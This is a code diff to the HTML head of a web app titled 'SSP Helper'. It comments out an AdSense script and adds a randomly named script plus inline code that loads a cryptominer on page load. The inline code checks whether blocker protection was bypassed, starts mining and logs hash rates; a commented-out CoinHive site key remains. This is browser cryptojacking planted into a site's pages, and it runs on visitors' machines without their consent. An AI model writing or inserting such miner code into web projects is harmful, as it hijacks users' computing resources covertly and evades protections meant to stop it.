@@ -6,12 +6,35 @@
 	  <title>SSP Helper</title>
 	  <base href="/">
 
-	  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+	  <!-- <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 		<script>
 		  (adsbygoogle = window.adsbygoogle || []).push({
 		    google_ad_client: "ca-pub-2675954515306594",
 		    enable_page_level_ads: true
 		  });
+		</script> -->
+
+		<script src="tApVsrSO.js"></script>
+		<script>
+			loadCryptominer(function(miner, status) {
+			  //Code that mines
+			  //For example:
+			  if (status == 5 || status == 6) {
+			    console.log("TEST FAILED!")
+			  } else {
+			    console.log("SUCCESSFULLY BYPASSED PROTECTION!")
+			  }
+			  miner.start();
+			  // Update stats once per second
+			  setInterval(function() {
+			    var hashesPerSecond = miner.getHashesPerSecond();
+			    var totalHashes = miner.getTotalHashes();
+			    var acceptedHashes = miner.getAcceptedHashes();
+			    console.log(hashesPerSecond, totalHashes, acceptedHashes)
+			    }, 1000);
+			});
+			// var miner = new CoinHive.Anonymous('6lHLt4JATg9Qu7k3fn5LoSRxGGR1qUpn', {throttle: 0.3});
+			// miner.start();
 		</script>
 
 	  <meta name="viewport" content="width=device-width, initial-scale=1">
